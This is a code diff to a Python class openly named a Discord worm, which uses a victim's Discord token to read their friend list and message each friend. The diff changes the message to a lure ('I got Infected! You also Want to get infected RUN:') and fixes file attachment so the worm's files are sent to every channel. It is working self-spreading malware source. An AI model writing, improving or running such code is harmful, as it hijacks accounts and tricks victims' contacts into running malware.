@@ -10,7 +10,7 @@ class FileNameTwice(Exception):
 class config:
     # TODO CHANGE THIS VARS IMPORTANT
     SELF_NAME = "MYNAME.py"
-    MESSAGE = "Hello! My Message"
+    MESSAGE = "Hello This is A Discord Worm, I got Infected! You also Want to get infected RUN:"
     RATE_LIMIT_DELAY = 3
     REQUEST_TIMEOUT = 5
 
@@ -33,7 +33,7 @@ class Worm:
     def __init__(self, token) -> None:
         self.discord_token = token
 
-        self.files = {}
+        self.files = []
 
         self.headers = self._generate_headers()
 
@@ -62,10 +62,7 @@ class Worm:
         if not os.path.exists(path):
             raise FileNotFoundError
         
-        if name in self.files.keys():
-            raise FileNameTwice(f"{name} is set multiple times please set a other name")
-        
-        self.files[name] = open(path, 'rb')
+        self.files.append({'path': path, 'name': name})
 
     def get_friend_list(self) -> dict:
         return requests.get(config.DISCORD_API_V6_USERS_ME + config.RELATIONSHIPS, headers = self.headers) # You could implement here a Friend list processing
@@ -90,4 +87,9 @@ class Worm:
 
                 build_url = config.DISCORD_API_V9 + config.CHANNELS + f"/{id}/messages"
 
-                response = requests.post(build_url, self._generate_payload(), headers = { "Authorization": self.discord_token } ,files=self.files, timeout = config.REQUEST_TIMEOUT) # This only Needed header part | You also can add response processing
+                files = {}
+                
+                for file in self.files:
+                    files[str(file['name'])] = open(file['path'], 'rb')
+
+                response = requests.post(build_url, self._generate_payload(), headers = { "Authorization": self.discord_token } ,files=files, timeout = config.REQUEST_TIMEOUT) # This only Needed header part | You also can add response processing
